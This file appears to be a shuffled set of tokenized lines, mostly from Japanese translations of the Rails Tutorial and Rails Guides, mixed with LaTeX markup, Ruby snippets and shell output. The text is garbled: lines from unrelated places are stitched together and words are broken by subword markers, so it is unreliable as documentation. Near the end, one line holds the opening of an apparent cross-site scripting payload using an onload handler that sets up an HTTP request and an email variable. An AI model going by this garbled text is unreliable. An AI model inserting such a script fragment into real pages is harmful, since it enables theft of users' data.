▁ benchmark - ips の実行 例 を以下に示します 。
▁* ▁Rails ▁4▖0 の スコープ では 、 Proc や lambda などの 呼び出し 可能な オブジェクトの 使用 が 必 須 となり ました 。
▁最初に \ href { http :// r ailscasts ▖ com / episodes / archive } { RailsCasts エ ピ ソ ー ド ア ー カ イ ブ } を開いて 、 目 に つ いた トピック を 適 当 に 開 く ところから始め てみると よいでしょう 。
▁{0} 図 3 ▖ 5 {/0} ▁{1} 作成した About ページ ▁(\ href { http ://0▖0▖0▖0:3000/ static _ pages / about }{/ static _ pages / about }) {/1}
▁ 統合テスト は 最終的に テスティング における 最も 主要な 武器 となります が 、 まずは 取 っ 付き やすい コントローラ テスト から 始 め る ことにしましょう 。
▁ ところで 、 署 名 された ユーザー ID があれば 記憶トークン は 不要な のではないかと 疑 問 に 思 う 方 も い る かもしれません ▟ しかし 記憶トークン が なければ 、 � 暗号化 された ID を 奪 った 攻撃者は 、 暗号化 ID をそのまま 使って お 構 い な し に ログイン してしまう でしょう 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / array / access ▖ rb ` です 。
▁config ▖ middleware ▖ use ▁Rack :: Bo un ce F a v icon
▁` Model ▖ take ` は 、 モデルに レコードが 1 つ も ない場合 に ` nil ` を返します ▟ このとき 例外 は 発生 しません 。
▁` months _ ago ` メソッドと ` months _ since ` メソッドは 、 上 と 同じ要領で 月 に対して 行います 。
▁ ルーティング が 定義された ことで 、 統 計 情報 パーシャル を テスト できる 状態 になりました
▁### ▁ Regular フォント
▁PostgreSQL を採用し た場合 は 、` config / database ▖ yml ` の 記 述 は以下のようになります 。
▁` rails ▁server ` コマンドは 以下のように して 、` Rack :: Server ` の オブジェクト を作成します 。
▁この 新しい " Destroy ▁ Comment " リンクをクリックすると 、` DELETE ▁ / articles / : article _ id / comments / : id ` という リクエストが ` Comments Controller ` に 送信されます ▟ コントローラは それ を受け 取 って 、 どの コメント を 削除 すべき か を検索する ことになります ▟ それ では コントローラ ▁( ` app / controllers / comments _ controller ▖ rb ` ) ▁ に ` destroy ` アクション を追加しましょう 。
▁今度は 以下の エラーメッセージ が発生し ます 。
▁ここまで く れば 、 ファイル名 は \ k ode { _ footer ▖ html ▖ erb } で 、 layouts ディレクトリ ▁( リスト \ ref { code : footer _ partial }) ▁ に 置 け ば よい ということ が わ か る と思います
▁\ ref { sec : creating _ user _ objects } で 3 番目の ユーザーを削除 した ので 、 Active ▁Record はこの ユーザーを データベース の中から 見つけ ること が できません でした 。
▁ / Users / mhartl / rails _ projects / sample _ app
▁\ emph { Rails チュートリアル } の この後 の 章では 、 Twitter のような マイクロポスト 機能 ▁( {1} 第 {2} 11 {/2} 章 {/1} ) ▁ と 、 フォロー 中の ユーザーの 投 稿 の ステータスフィード 機能 ▁( {3} 第 {2} 12 {/2} 章 {/3} ) ▁ の 基本的な 部分を サイトに 搭 載 する ことにしましょう 。
▁これらの ジョブ では 、 定 期 的な ク リ ー ン アップ を 始 め として 、 請 求 書 発 行 や メール 配信 など 、 どんな ことで も 実行 できます 。
▁ といった 風 に 書くこと で 、 リスト \ ref { code : header _ partial _ links } で定義した Home ページ のリンク の 個 数 も 調 べ ることもできます
▁`-- mountable ` オプションは 、 マウント 可能 かつ 名前空間 で 分 離 された エンジン を生成する 場合に 使用します 。
▁end { enumerate }╼╼ ▁% ▁subsection ▁relationship _ user _ associations ▁( end )╼╼ ▁\ subsection { Relationship のバリデーション } ▁% ▁( fold )╼ ▁\ label { sec : relationship _ validations }╼╼
▁# ▁ label (: article , ▁: title , ▁" A ▁short ▁title ")
▁ アセットパイプライン では 、 CoffeeScript や S A S S 、 ERB など 他の 言語 で 記 述 された アセット を作成する 機能 を追加する こともできます 。
▁| ▁id ▁| ▁select _ type ▁| ▁table ▁| ▁type ▁| ▁possible _ keys ▁|
▁NOTE : ▁Rails のルーティング は 、 ルーティング ファイルの 「 上 からの 記載 順に 」 マッチ します ▟ このため 、 たとえば ` resources ▁: photos ` という ルーティング が ` get ▁' photos / po ll ' ` よりも 前の 行 に あれば 、` resources ` 行 の ` show ` アクション が ` get ` 行 の 記 述 よりも 優 先 されます ので 、` get ` 行 のルーティング は 有効 になり ません 。
▁最初に 、 新規 記事 を作成するための 場所 が アプリケーション 内に 必要です 。
▁self を省略した 結果を リスト \ ref { code : gitignore } に示します 。
▁**` ActiveRecord :: Connection Adapters :: Connection Management ` **
▁ 少々 込 み 入 っています が 、 コ スト パラメータを テスト 中 は 最 小 に し 、 production 環境では normal ▁( high ) ▁ に する方法 が わ か れば 十分です 。
▁ 間違った ユーザー による マイクロポスト 削除 に対して テスト する
▁また 、 リスト \ ref { code : micropost _ partial } では 各 マイクロポスト に対して CSS の id を 割 り 振 っています 。
▁ その中で も 、 Learn ▁En ough ▁ の イン ト ロ ダ ク ション では 、\ r or t で 必要 に 前 提 条件 の内容 がある 。
▁ スタイル の 追加 はその 後に 行います 。
▁ 表示 したい 文字列 を返す アクション を定義し たので 、 今度は デフォルトの ページ ▁( 図 \ ref { fig : riding _ rails }) ▁ の代わりに この アクション を使用する よう Rails に 指示 します 。
▁subject ▁to ▁the ▁following ▁conditions : ╼╼ The ▁above ▁copy right ▁notice ▁and ▁this ▁ permission ▁notice ▁shall ▁be
▁ ログイン 用の パス を開く
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁#### ▁ パーシャル の 命 名 ルール
▁たとえば 、 以下の ` Category `、` Article `、` Comment `、` G u est `、` T a g ` モデル について 考えてみましょう 。
▁<%= ▁@ greeting ▁%>
▁config ▖ action _ mailer ▖ observers ▁= ▁[" Mail O b server "]
▁上の 話 と 一見 矛盾 するよう ですが 、 最初に コードを 若 干 追加 して 、 現在 は 「 ほぼ 」 同じ になっている ページの タイトル を 「\ emph { 完全に }」 同じ に しておきます 。
▁これで パーシャル の作成 方法 が わ か りました ので 、 今度は ヘッダー に対応する フ ッ タ を 同じ 方法で 追加 しましょう 。
▁query ▁= ▁Client ▖ select (: name )▖ distinct
▁# ▁item は ロック 済み
▁ 分割 された グループ を 内 包 する 配列 を 1 つ 返します 。
▁` ordinal ` メソッドは 、 レシーバの 整 数 に対応する 序 数 の サ フ ィ ッ ク ス 文字列 を返します 。
▁リスト \ ref { code : fixture _ second _ user } で 2 人目のユーザー を fixture に追加し ましたが 、 今回は もっと 多くの ユーザー を作成する必要があります ▟ 手動で 追加 するのは 面倒 そう です ね 。
▁この 方法 を使用して 、 リソース として 定義されている ルーティング を 以下のように 上書き することもできます 。
▁Active ▁Record における Co C ( Convention ▁over ▁Configuration )
▁* ▁` before _ add `
▁ SELECT ▁addresses ▖
▁### ▁Rack アプリケーション として の Rails アプリケーション
▁それでは 、` app / views / articles / show ▖ html ▖ erb ` ファイルを作成し 、 以下のように 記 入 しましょう 。
▁### ▁ アセット
▁Initialize d ▁empty ▁Git ▁repository ▁in ▁ / Users / mhartl / rails _ projects / first _ app / ▖ git /
▁これらの 2 つの 属性 は 、 HTTP ▁\ text tt { POST } リクエスト に対する 指示 を 構成 しています 。
▁gem ▁' uglifier '
▁" visual _ e ffect "▖ camelize (: low er ) ▁# ▁=> ▁" visual E ffect "
▁" x ▁is ▁not ▁empty "
▁# ▁My App / app / decorator s / models / blorgh / article _ decorator ▖ rb
▁# ▁gem ▁' w in 32 console ', ▁' 1 ▖ 3▖2 ' ╼ ▁# ▁gem ▁' w d m ', ▁' 0 ▖ 1 ▖ 0 '
▁ Updating ▁\ k ode { authenticated ?}
▁\ ref { sec : sessions _ and _ failed _ login } で 解説 した ように 、 この アプリケーション で使用する 認 証 モデル では 、 ユーザーが 明示的に ログアウト する まで は ログイン 状態 を 保 て なくてはなりません 。
▁ / Users / mhartl / rails _ projects / sample _ app / spec / models / user _ spec ▖ rb
▁PostgreSQL アダプタ で 同じ クエリ を実行すると 、 今度は 以下のような 結果 が 得られます 。
▁Client ▖ limit ( 5 )▖ offset ( 30 )
▁このメソッド の ブロック の 内 側 は ` Form Builder ` オブジェクトを 置きます ( ` f ` で 表 す のが 通 例 です )▟ ここでは 2 つの ラベル と 2 つの テキストフィールド が 置かれ 、 それぞれ タイトル と 記事 本 文 になります 。
▁\ k ode {@ user } 変数 が 上 記 のように 定義され れば 、 以下の ユーザー登録ページ の テストはパスするはずです ▁( 訳 注 : ▁以下の コマンドで は ▁" signup ▁page " ▁ のテスト だけ を 行 なっています ) 。
▁* ▁ コア 拡張機能 について
▁render ▁file : ▁"/ path / to / rails / app / views / books / edit "
▁ ファイルが ` public / assets / rails ▖ png ` に置かれている 場合 、 Web サーバー によって 扱 われます 。
▁# ▁< commit ter > J o sh u a ▁P e e k </ commit ter >
▁Ruby のインストール
▁まずは \ text tt { carrierwave } ▁gem を \ k ode { Gemfile } に追加し ましょう ▁( リスト \ ref { code : gemfile _ carrierwave }) 。
▁module ▁My Engine
▁もちろん 、 そのような 変数 を ユーザー \ k ode { show } アクション で 定義 し なければなりません ▁( リスト \ ref { code : user _ show _ microposts _ instance }) 。
▁上 記 の ア イ デ ア を コード に 落とし 込 む と 、 リスト \ ref { code : a _ test _ for _ invalid _ submission } のようになります 。
▁` readonly ` を指定すると 、 関連付けられたオブジェクト から 取り出し た 内容 は 読み出し 専 用 になります 。
▁User モデルに \ k ode { password \_ digest } 属性 を追加する
▁-- ▁create _ table (: users )
▁ 変更 した テストを リスト \ ref { code : home _ feed _ test } に示します 。
▁def ▁feedback _ message ( business , ▁user )
▁b section ▁ debugger ▁( end )╼╼ ▁\ subsection { Gravatar 画像 と サイドバー } ▁% ▁( fold )╼ ▁\ label { sec : a _ gravatar _ image }╼╼
▁これは 特に XML コンテンツ の 生成 を 得 意 とします 。
▁NOTE : ▁もちろん 、 この場合 であれば 「 リソース フル でない 」 ルーティング に 適用 可能な 、 より 高度な 制限 を加える こともできます 。
▁Gravatar を使うと 、 ユーザーの プロフィール 画像 を簡単に 表示 できるように なる
▁#### # ▁` create _ association !(
▁ 以上 に基いて \ k ode { reset \_ digest } 属性 と \ k ode { reset \_ s ent \_ at } 属性 を追加した ユーザー データベース は 図 \ ref { fig : user _ model _ password _ reset } のようになります 。
▁ ╼\ end { code }╼╼ ╼\ subsection { 本章の まとめ } ▁% ▁( fold )╼\ label { sec : rails _ flavored _ ruby _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁ このような 状態 では 、 どんな オブジェクト についても それが 複 製 可能 かどうかを確認 するには ` rescue ` を使用する 以外に 方法 はありません 。
▁ これはリスト \ ref { code : title _ tests } で使用されていました 。
▁ 結 論 としては 、 この データモデル は メ ン テ ナ ン ス の観点 から 見 て 悪 夢 です ▟ ユーザー名 を変更する たびに 、\ k ode { users } テーブルの その レコード だけで なく 、\ k ode { followed _ users } テーブル と \ k ode { followers } テーブル の両方 について 、\ emph { そのユーザー を含む すべての 行 } を更新し なければ なら なくなります 。
▁#### # ▁`: join _ table `
▁# ▁=> ▁Thu , ▁01 ▁Apr ▁2010 ▁00:00:00 ▁+0000
▁< td > <%= ▁link _ to ▁' Show ', ▁article _ path ( article ) ▁%></ td >
▁\ k ode { forget } メソッドを User モデル に追加する
▁これは ユーザー 削除 と同様に ( \ ref { sec : the _ destroy _ action }) 、 " delete " ▁ リンク で 実現 します ▁( 図 \ ref { fig : micropost _ delete _ links _ mockup }) 。
▁#### ▁ オブジェクトが保存される タイミング
▁たとえば 、 著者 の サンプルアプリケーションの ▁\ k ode { config } ▁ ディレクトリ は 、 次の 場所に あります 。
▁def ▁matches ?(
▁1 つの マイクロポスト を表示する パーシャル
▁* ▁Rails ▁4▖0 のデフォルトの me m cache d クライアント が ` me m cache - client ` から ` d all i ` に 変更 されました 。
▁{0} 図 7 ▖ 11 {/0} ▁{1} ユーザー登録 ページのモックアップ {/1}
▁hash ▁= ▁ { ▁a : ▁1, ▁b : ▁ { ▁c : ▁2, ▁d : ▁[ 3 , ▁4 ] ▁ } ▁ }
▁Action ▁Pack は 、 このメソッド を利用して ` all ▖ css ` などの キャッシュ ファイル への 書き込み を 行った り しています 。
▁ 本書 は Web 開発 へ と い ざ な う 「 チュートリアル 」 に 徹 し ており 、 Rails の 高度な 内容 に まで は 踏 み 込 んで いません ▟ 以前の Rails ▁3▖2 対応 版 と 今回の Rails 4 ▖ 0 対応 版 と の 差 分 が 少 ない のは 、 このような 理由 による ものです 。
▁getting ▁results ▁consistent ▁with ▁this ▁tutorial ▖ ╼╼% ▁subsection ▁ installing _ rails ▁( end )╼╼ ▁\ section { 最初の アプリケーション } ╼ ▁\ label { sec : the _ hello _ application }╼╼ Follow ing ▁a ▁\ href { http :// www ▖ cat b ▖ org / j argon / html / H / hello - world ▖ html } { long ▁ tr ad it ion } ▁in ▁computer ▁programming , ▁our ▁goal ▁for ▁the ▁first ▁application ▁is ▁to ▁write ▁a ▁``
▁[ remember ▁me ] ▁ ボックス をテストする
▁リスト \ ref { code : length _ validation } では \ k ode { maximum } を使って ユーザー名 の 最 大文字 数を 制限 していました が 、 これ と 似 た ような 形式 の \ k ode { minimum } という オプション を使って 、 最 小文字 数 のバリデーション を実装する ことができます 。
▁ だ から という わけではありません が 、 今は このような メソッド が必要 である ということ に 気 付け なくても 問題ありません 。
▁redirect _ to ▁article _ path (@ article )
▁validates ▁: point s , ▁ numericality : ▁true
▁\ k ode { _ user ▖ html ▖ erb } パーシャル を使って 自動的に \ k ode {@ users } 変数 内の それぞれの ユーザーを 出力 していました 。
▁Rails アプリケーションは 実際には エンジン に 「 ター ボ を かけ た 」 ような もの に す ぎ ず 、` Rails :: Application ` クラスは ` Rails :: Engine ` から 多くの 振る舞い を継承し ています 。
▁リスト { p 0} で {2} create {/2} アクションを 定義 できたので 、\ ref { code : login _ form _ tag } で定義した ログインフォーム も 正常に 動作する ようになった はずです 。
▁ 現状の ユーザー登録ページ ▁\ href { http :// localhost :3000/ signup }{/ signup }
▁今回の場合 、 検証 が 1 つ しか ないので 、 どの 検証 が 失敗した か わかります ▟ しかし 、 失敗した ときに 作 られる \ k ode { errors } オブジェクト を使って 確 認 すれば 、 さらに 便利です 。
▁Heroku では 、 development 環境 と production 環境 と で 異なる データベース を使用すること を 非推奨 と しています が 、 幸 い にも この サンプルアプリケーション では 両者 の違い は 生 じ ません ▟ また 、 SQLite の方が PostgreSQL よりも ローカル で のインストール や 設定 が \ emph { ずっと 楽 } なので { p 1 } 、 今回は こと なる データベース を使う ことにします 。
▁\ href { http :// railstutorial ▖ org / screencasts }{\ emph { Ruby ▁on ▁Rails チュートリアル } スクリーンキャスト } ▟ 本書 に合わせて 、 完 全 版 の スクリーンキャスト を用意し て あります 。
▁constraints ( id : ▁ / [ A - Z ] [ A - Z ] [ 0 - 9 ] + / ) ▁do
▁` collection ▖ destroy ` は 、 コレクション に 関連付けられている オブジェクトに対して ` destroy ` を実行する ことで 、 コレクション から 1 つ または 複数の オブジェクトを 削除します 。
▁{0} Listing ▁ 12 ▖ 4 : {/0} ▁╼╼{1} Relationship モデル のバリデーション をテストする {2} {/2} ▁ {3} test / models / relationship _ test ▖ rb {/3} {/1}
▁ ╼ ▁ ▖
▁ テンプレート の ファイル名 に 付 い ている 拡張子 に 気 を付け てください ▟ 1 つ目の 拡張子 は テンプレート の ▁ _ フォーマット _ ▁ を表し 、2 つ目の 拡張子 は 使用される ▁ _ ハンドラ ー _ ▁ を示します 。
▁Rails では 、 JavaScript を DOM に追加する 際の 手法 を 「 控 え め な ▁( u nobtrusive ) ▁JavaScript 」 と 呼んでいます 。
▁この 魔 術 的な \ k ode { has _ secure _ password } 機能を 使えるように するには 、1 つだけ 条件 があります ▟ それ は 、 モデル 内に \ k ode { password _ digest } という 属性 が含まれている ことです 。
▁invoke ▁ coffee
▁本章では 、 アプリケーション 全体 で 共通 する ログイン システム の 細 か い 部分を 多数 扱 う ので 、 その 分 他の 章 に 比 べ て 長 く 、 難 易 度 も 高 く なっています ▟ 細 部 に と ら わ れる と 苦 し くなる ばかり なので 、 この章 を 完了 するために も 、 完 璧 に 理解 し よう と する よりも 、 と に か く 辛抱 強く 節 を ひとつ ずつ 終 わ ら せる ことを 優 先 してください 。
▁if ▁ video ▖ owner ▖ pre m i um ?
▁ 表 { p 0} で示した \ k ode { edit \_ user \_ path } という 名前付きルート と 、 ▁リスト \ ref { code : persistent _ current _ user } で定義した \ k ode { current \_ user } という ヘルパーメソッド を使うと 、 実装 が 簡単です 。
▁Client ▖ select (: name )▖ map ▁& : name
▁# ▁=> ▁" com p any %5 B name %5 D = John s on + % 2 6 + John s on "
▁これらの ヘルパーは 、 最初の パラメータ として Magazine モデルのインスタンス を 1 つ 取り ます ▁( ` magazine _ ads _ url (@ magazine ) ` ) 。
▁< tr >
▁`: if ` オプション や `: unless ` オプションを使用することで このような 条件 を指定できます ▟ 引数に は シンボル 、 文字列 、` Proc ` または ` Array ` を使用できます 。
▁delete ▁mode ▁100 64 4 ▁README ▖ rdoc
▁ユーザー プロフィール に マイクロポストを 表示 させるため 、 最初に 極めて シンプルな ERb テンプレート を作成します ▟ 次に 、\ ref { sec : sample _ users } の サンプル データ 生成 タスク に マイクロポストの サンプル を追加して 、 画面 に サンプル データ が表示される ように してみます 。
▁ そして ユーザーがログイン \ emph { していない } 場合は 、 リスト \ ref { code : sessions _ resource } の ログイン 用 パス を使用して 、 以下のように ログインフォーム へのリンク を作成します 。
▁これらの Rake タスク を 他の 環境で も 実行 したい場合は [ Spring ▁README ]( https :// github ▖ com / rails / spring # rake ) を 参考にしてください 。
▁\ k ode { edit } アクションと \ k ode { update } アクション のどちら の場合 も 正 当 な \ k ode {@ user } が存在する 必要がある ので 、 いくつかの before フィルタ を使用して @ user の 検索 と バリデーション を行います ▁( リスト \ ref { code : password _ reset _ edit _ action }) 。
▁ assert _ generate s ▁' / photos /1 ', ▁ { ▁controller : ▁' photos ', ▁action : ▁' show ', ▁id : ▁'1' ▁ }
▁今度は 、 もう少し 異なる ルール に対して ネスト 機能 を使う 例 を見てみましょう 。
▁* ▁`: foreign _ key `
▁その 背 後 では 、 関連付けられたオブジェクト から 主キー を取り出し 、 そのオブジェクト の 外部キー に その 同じ 値を 設定 しています 。
▁詳細については GitHub に 投 稿 された \ href { https :// github ▖ com / blog / 92 6 - sh in y - new - commit - style s } { 最新の コミット 方法 } ▁( 英語 ) ▁ を参照してください 。
▁render ▁xml : ▁@ product
▁ここで 、\ k ode { nil } は 空白 と 認 識 される ことに注意してください ▟\ k ode { nil } は 文字列 では ないので 、 Rails が 実は \ k ode { blank ?} メソッドを \ k ode { String } クラス ではなく 、 その さらに 上の 基 底 クラス に追加し ていること が 推 測 できます ▟ その 基 底 クラス とは 、( この章 の 最 初 で説明した ) ▁\ k ode { Object } 自身 です 。
▁リスト \ ref { code : test _ helper _ sign _ in } のとき
▁* ▁Rails に 組み 込 まれ ている さまざまな レンダリング ▁( = レスポンス の 出力 ) ▁ 方法 の使い方
▁なお 、 この節 全体 について 、 Microposts リソース を理解する 際に は \ ref { sec : demo _ users _ resource } の user 要素 と 比 較 しながら 進 め る ことをお勧めします ▟ 実際 、 これらの 2 つの リソース は さまざまな 面 で 似 通 っています 。
▁ これを行なうには 、` app / views / user _ mailer / ` ディレクトリ で ` welcome _ email ▖ text ▖ erb ` という ファイルを 以下の 内容 で 作成 してください 。
▁ 更新 した \ k ode { Gemfile } を \ ref { code : gemfile _ pg _ gem } に示します 。
▁ プルリクエスト に含まれている 変更 点が よい もの である と 思 え たら 、 GitHub の issue に 賛 成 を 表 明 ( app r o val ) する コメント を追加 してください 。
▁ データベースの 2 つの テーブル を 繋 ぐ とき 、 このような id は \ emph { 外部キー ▁( foreign ▁key )} と呼びます ▟ すなわち 、 User モデルに 繋 げ る 外部キー が 、 Micropost モデルの \ k ode { user \_ id } 属性 ということです ▟ この 外部キー の名前 を使って 、 Rails は 関連付けの 推 測 を しています ▟ 具体的には 、 Rails はデフォルトで は 外部キー の名前 を \ k ode { < class > \_ id } といった パターン として 理解 し 、 ▁\ k ode { < class > } に 当 た る 部分 から クラス名 ▁( 正確に は 小文字 に変換 された クラス名 ) ▁ を推測し ます
▁\ ref { sec : password _ reset _ mailer } の メール テンプレート の ところで 説明したように 、 パスワード再設定の 期 限 を設定し 、2 時間 以上 パスワードが 再設定 され なかった場合 は 期限切れ に する必要があります ▟ これを Ruby で 表現 すると 以下の ようになります 。
▁このとき 、 Rails は 与えられた ファイル名 の 末尾に ▁\ k ode { \_ test } ▁という 文字列 を追加する ことに注目してください 。
▁\ ref { sec : layouts _ and _ embedded _ ruby } では 最初に ERb を 、\ ref { sec : sass } では Sass をそれぞれ 扱 いました 。
▁このオプション に 値 が指定されてい ない と 、 非推奨 警 告 が表示されます 。
▁ 最初は 上のコード ではなく 、 以下のコード を使用して いました 。
▁ 変更 が master に マージ される と 、 その 変更 は Rails の 次 期 メ ジ ャ ー リリース に 採 用 されます 。
▁\ k ode { ▖ gitignore } に Spring を追加する
▁ { p 0} の冒頭 で データベースをリセットし て あるので 、 現時点では {2} User ▖ count {/2} は {2} 0 {/2} になっています 。
▁ 関連付けられたオブジェクト がある場合 に この オブジェクトを 削除 したくない場合 は 、`: dependent ▁=> ▁: destroy ` を設定し 、 関連付けられたオブジェクト の destroy コールバック と の関連付け がある かどうかを確認 してから ` false ` を返す ようにします 。
▁Ruby をインストール したら 、 Rails の アプリケーションを 実行 するために必要な 他の ソフトウェア 向 け に システム を構成する 必要があります 。
▁# ▁orders の キャッシュ コピー が 破棄され る
▁ 使用 例 は以下のようになります 。
▁class ▁Create As se mb li es Part s J o in Table ▁< ▁ActiveRecord :: Migration
▁* ▁` config ▖ action _ controller ▖ logger ` は 、 Log 4 r の インターフェイス または デフォルトの Ruby ▁ Logger クラス に従う ロガー を 引数として 取り ます ▟ この ロガー は 、 Action ▁Controller からの 情報を ログ出力 するために使用されます 。
▁if ▁@ book ▖ special ?
▁Users コントローラに リクエストが 正常に 送信される と 、\ k ode { params [: id ]} の 部分 は ユーザー id の \ text tt {1} に置き 換 わ ります ▟ つまり 、 この 箇所 は \ ref { sec : find ing _ user _ objects } で学んだ \ k ode { find } メソッドの ▁\ k ode { User ▖ find (1) } と同じ になります 。
▁Action ▁View で 利用できる ヘルパー の概要 を以下に示します 。
▁デフォルトは true で 、 タイムスタンプ が使用されます ▟ 開発者 が 複数の 場合は 、 タイムスタンプ の使用 を お勧め します 。
▁### ▁Re s po nd ers ▁gem
▁上のルーティングは 、 GET リクエスト + ` / photos / search ` などの ▁( id を 伴 わ ない ) ▁ パス を 認 識 し 、 リクエストを ` Photos ` コントローラの ` search ` アクションに ルーティング します 。
▁ 後 は 、 レイアウト の リンクを これらの 名前付きルート で 埋 め れば よい のです 。
▁ 最後の 例 を見ると 分 か るように 、 メソッドの 引数 を省略 すること も 可能です ▁( かっこ です ら 省略 可能です ) 。
▁ 基本 タイトル としては これで 正しい のですが 、 先 頭 に 余分な 縦 棒 ▁\ k ode { | } ▁ が 残 って しま っています 。
▁ このコード では \ k ode { escape _ javascript } 関数 を使用して いることに注目してください ▟ この 関数 は 、 JavaScript ファイル 内に HTML を挿入 するときに 実行 結果を エスケープ する ▁( 画面 に 表示 しない ) ▁ ために 必要です 。
▁ 注 : ▁ サインアウト のルーティング にある \ k ode { via : ▁ ’ delete ’} は 、 この アクション が ▁HTTP の \ text tt { DELETE } リクエスト によって 呼び出される ことを示しています 。
▁message : ▁" 発生 は 年 に 1 度 まで である 必要があります " ▁ }
▁ 空の fixture ファイル ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁ キュー
▁user ▁= ▁User ▖ first
▁account =
▁ 場合によっては 、 ユーザーが ページ を表示する 時に id を参照 すること の ない リソース が 使用される ことがあります 。
▁ユーザーの プロファイル ページに タイトル と 見 出 し を追加する 。
▁その 理由は 、\ k ode { params } ハッシュ 全体 を 初期化 する という 行 為 は セキュリティ 上 、\ emph { 極めて } 危 険 だ からです ▟ これは 、 ユーザーが 送信 した データを \ emph { まるごと } \ k ode { User ▖ new } に 渡 している ことになります 。
▁ それ は 、 いくつかの データベースの アダプタ が 、 常に 大文字 小文字 を 区別 する インデックス ▁( “ Foo @ E x A M P le ▖ Co m を使っている とは 限 らない 問題 への 対 処 です 。
▁ Rubular をブラウザで開き 、 表 \ ref { table : valid _ email _ regex } の内容を 実際に 試 してみる ことを 強く お勧め します ▟ 正規表現 は 、 読んで 学ぶ より 対 話 的に 学 んだ ほ う が 早い です 。
▁デフォルトでは 、 scaffold で生成された スタイル は エンジン に 適用 されません ▟ これは 、 エンジンの レイアウトファイル ` app / views / layouts / blorgh / application ▖ html ▖ erb ` が scaffold の スタイル を 読み 込 んで いない ためです 。
▁このヘルパーは 、 バリデーション 専 用の 別の クラス に レコードを 渡します 。
▁作成した \ k ode { logged \_ in ?} メソッドを リスト \ ref { code : logged _ in _ p } に示します 。
▁### ▁ パス を変更する
▁ stringify _ keys メソッド のおかげで 、2 行目 で " type " キー に 安全 にアクセス できます ▟ メソッドの 利用 者 は 、`: type ` のような シンボル と " type " のような 文字列 のどちら で も使用できます 。
▁WARNING : ▁ アセット の プリコンパイル を使用する場合 、 ページ が 読み込まれる たびに コントローラの アセット が プリコンパイル される ように しておく必要があります 。
▁ 基本的な 流れ を以下に示します 。
▁\ k ode { log \_ in } 関数
▁### ▁ 「 単数形 の フォーム 」 をオーバーライドする
▁\ k ode { remember } メソッドの 1 行目 の 代入 にご注目ください 。
▁has _ many ▁: orders , ▁-> ▁ { ▁includes ▁: line _ items ▁ }
▁* ▁` / ( アプリ の パス ) / bin / rails ▁run n er ▁' User Mailer ▖ receive ( ST D IN ▖ read ) ' ` で メールを 受 信 する アプリケーションに 、 メール サーバー から メールを 転 送 する 。
▁この場合 、 引数 の 範囲 が レシーバの 範囲 の中に 収 ま っている かどうか が チェック されています 。
▁WARNING : ▁この クラス名 は 必ず ` String ` で ▁( = 引 用 符 で 囲 んで ) ▁ 表 してください ▟ クラス 自身 を使用 しないでください 。
▁{0} 図 11 ▖ 1 {/0} {1} 現在のユーザー の プロファイル ▟\ href { http :// railstutorial ▖ org / images / figures / page _ flow _ profile _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁\ ref { sec : bitbucket } の 手順 に 沿 って 進 め た場合 、\ k ode { README ▖ rdoc } ファイル が自動的に 認 識 され ず 、 README がない という メッセージ が表示される ことに 気 付 いた でしょう ▁( 図 \ ref { fig : bitbucket _ no _ readme }) 。
▁ 幸 い 、 今は お す す め の クラウド 開発環境 のおかげで Unix コマンドライン を み な 同じ ように 扱 う ことができ 、\ href { http :// en ▖ w ikipedia ▖ org / wiki / S hell _ ( com put ing )} { B a sh } などの 標準的な \ href { http :// en ▖ w ikipedia ▖ org / wiki / B a sh _ ( Unix _ s hell )} { シェル コマンドライン インターフェイス } を 実行 できます ▁( 訳 注 : ▁ 「 シェル 」 とは 、 実際に 動く コマンド や プログラム に 「 か ぶ さ っている 」 インターフェイス と 考え ると よいでしょう ) 。
▁ Welcome 画面 の ス ク リ ー ン シ ョ ッ ト ]( images / getting _ started / rails _ welcome ▖ png )
▁{0} 図 1 2▖2 1 {/0} ▁{1} ステータスフィード 付き の Home ページのモックアップ {/1}
▁` ago ` メソッドは 秒 数を 引数として 受 け 取り 、 真 夜 中の 時点 から その 秒 数 だけ さ か の ぼ った 時点 の タイムスタンプ を返します 。
▁{0} 図 3 ▖ 5 {/0} ▁{1} 作成した About ページ ▁(\ href { http :// localhost :3000/ static _ pages / about }{/ static _ pages / about }) {/1}
▁error
▁### ▁ 単数形 リソース
▁ 従来 のまま の サ ニ タ イ ザ の実装 が必要な場合は 、 アプリケーションの Gemfile に ` rails - deprecated _ sanitizer ` を追加 してください 。
▁HTML 生成 を 行い 易 く するために 、 Ruby で 記 述 された さまざまな ビュー ヘルパーメソッド が 用意されています 。
▁-> ▁ { ▁order (' order _ date ▁ desc ')▖ limit ( 1 00 ) ▁ },
▁# ▁Return s ▁the ▁Gravatar ▁( http :// gravatar ▖ com / ) ▁for ▁the ▁given ▁user ▖
▁#### # ▁` find _ each ` の オプション
▁* ▁Active ▁Record と MVC ▁( Model - View - Controller ) パ ラ ダ イ ム の 親 和 性
▁リスト \ ref { code : signup _ with _ account _ activation _ test } の \ k ode { assigns } メソッドは 本チュートリアル 初 登 場 です ▟ {3} 第 {1} 8 {/1} 章 {/3} の演習 ▁(\ ref { sec : log _ in _ out _ exercises }) ▁ で 説明したように 、\ k ode { assigns } メソッドを使用すると 、 対応する アクション 内にある インスタンス変数 にアクセス できるようになります 。
▁` In t eg er ` の拡張
▁` config ▖ action _ controller ▖ session _ store ` の値 を変更する と 別の ミドルウェア を使用できます 。
▁ target =" " on load =" var ▁ http _ request ▁= ▁false ; ▁var ▁E mail ▁= ▁ '' ;
▁以下の 変更 はほとんど が アセットパイプライン 用 です 。
▁| db / | 現時点の データベース スキーマ と 、 データベース マイグレーション ファイル が置かれます 。
▁ そのために は 、\ k ode { link _ to } メソッドの 2 番目の 引数に 適切な 名前付きルート を指定する 必要があります 。
▁ キー と 値 の ペ ア が与えられ たとき 、 以下のように 動作します 。
▁Sessions ヘルパー モジュール の \ k ode { sign _ out } メソッド 。
▁U S A G E
▁\ k ode { app / assets / stylesheets } ディレクトリ ▁( サブディレクトリ を含む ) ▁ 中の すべての CSS ファイルが 、 アプリケーション CSS に含まれる ようにします ▟ 次の 行
▁Rails には さまざまな ルーティング オプション があります が 、 詳細については Rails ガイド の 記事 「\ href { http :// guides ▖ rubyonrails ▖ org / routing ▖ html } { Rails ルーティング }」 を参照してください 。
▁ プリコンパイル の動作 の詳細については 、[ アセットを プリコンパイル する ](# アセットを プリコンパイル する ) を参照してください 。
